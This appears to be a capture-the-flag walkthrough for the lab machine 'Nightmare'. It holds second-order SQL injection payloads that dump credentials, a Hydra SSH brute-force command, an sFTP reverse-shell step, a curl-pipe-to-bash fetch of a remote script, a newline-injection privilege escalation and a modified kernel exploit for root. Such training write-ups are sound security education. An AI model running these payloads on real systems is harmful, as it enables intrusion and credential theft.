# Nightmare

*Converted from: Nightmare.pdf*

---

# Nightmare
## **7 [th] July 2018 / Document No D18.100.09**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Authors: decoder & stefano118**

**Difficulty: Insane**

**Classification: Official**



Page 1 / 9


## **SYNOPSIS**

Nightmare is a very challenging machine which has many access restrictions in place. It focuses

mainly on several unique topics and exploit modification, however since its release a valid 32-bit

version of the exploit PoC has been released.


## **Skills Required**


  - Advanced knowledge of Linux

  - Intermediate knowledge of SQL

injection techniques


## **Skills Learned**


  - Second order SQL injection

  - SSH brute forcing

  - Exploiting misconfigured sFTP

  - Attacking without touching disk

  - Reverse engineering 64-bit binaries

  - Exploit modification


Page 2 / 9


​


## **Enumeration** **Nmap**

Nmap reveals Apache as well as OpenSSH running on a non-standard port. OpenSSH includes

an interesting custom banner of **non-recent ver** ​ .


Page 3 / 9



​


​ ​

​


## **Dirbuster**

Dirbuster finds **/secret/download.php** ​, however after fuzzing a parameter of **filename** ​ and using

it to view the source of **download.php** ​, it does not appear vulnerable.


Page 4 / 9



​ ​

​


​


​

​


## **Exploitation** **SQL Injection**

The **notes.php** ​ page is vulnerable to second order SQL injection. As the username is passed

unfiltered in a secondary query after registration, it is possible to create an account with an SQL

query as the username. Upon loading the notes page after logging in, the results of the SQL

query will be visible.


​

​



​


Registering with a username of **a') UNION SELECT TABLE_NAME,2 FROM** ​

​



​


​

**information_schema.tables-- -** will reveal all table and column names. Running **a') UNION** ​



​


​

​

**SELECT username,password FROM sysadmin.users-- -** will reveal multiple sets of credentials in



​


​

​


plaintext.



​


​

​


Page 5 / 9



​


​

​


​


## **SSH Brute Force**

Using the obtained usernames and passwords, it is fairly trivial to brute force SSH using Hydra or

another similar tool. For Hydra, the syntax is **hydra -L usernames.txt -P passwords.txt -s 2222** ​

**ssh://10.10.10.66 -v -t 4**


Attempting to SSH in with the credentials is successful, however there is no TTY set for the

ftpuser.


Page 6 / 9



​


​


## **sFTP Shell**

Exploit: [https://github.com/SECFORCE/sftp-exploit​](https://github.com/SECFORCE/sftp-exploit)


Using the above exploit, it is fairly straightforward to obtain a shell. A Python one-liner or any

other reverse shell method that does not require write access must be used. There are also

outbound firewall rules set, so the attacking machine must be listening on port 443.


Page 7 / 9



​



​


​

​

​


​

​ ​ ​

​


## **Privilege Escalation** **Decoder - GUID Binary**

As the ftpuser does not have write access, it is possible to utilize curl to pipe LinEnum to bash.

For example: **curl -s http://<LAB IP>/linenum.sh | bash** ​ . Note that LinEnum must be slightly

modified to force thorough checks without the **-t** ​ flag.


LinEnum finds a GUID file for the Decoder user at **/usr/bin/sls** ​, which can be easily exfiltrated

through Base64 encode/decode or netcat. IppSec’s Nightmare video demonstrates how to

reverse engineer the binary in great detail using Radare2.


Video: [https://www.youtube.com/watch?v=frh-jYaUvrU&t=4975s​](https://www.youtube.com/watch?v=frh-jYaUvrU&t=4975s)


By passing the **-b** ​ flag, the **sls** ​ binary does not filter newline characters. Entering **sls -b "$(printf** ​

**'\n/bin/sh')"** will execute **sh** ​ as part of the decoder group.


Page 8 / 9



​

​

​


​

​ ​ ​

​


​


​

​

​ ​


​ ​


## **Root**

Exploit: [https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112​](https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112)


As gcc is not available on the target machine, the exploit must be compiled locally. LinEnum

​

​

​ ​


​ ​



​


previously identified **/home/decoder/test** ​ as world-writable and can be used to drop the binary.

​

​ ​


​ ​



​


​

Attempting to run the exploit without modification will fail as the target is missing **/etc/lsb-release** ​ .

​ ​


​ ​



​


​

​

Simply changing references of **/etc/lsb-release** ​ to **/home/decoder/test/lsb-release** ​ is sufficient.


​ ​



​


​

​

​ ​


​ ​



​


​

​

​ ​


With the example **lsb-release** ​ file above and the PoC for **CVE-2017-1000112** ​ dropped on the

target, running the exploit binary immediately grants a root shell.


Page 9 / 9



​


​

​

​ ​


​ ​


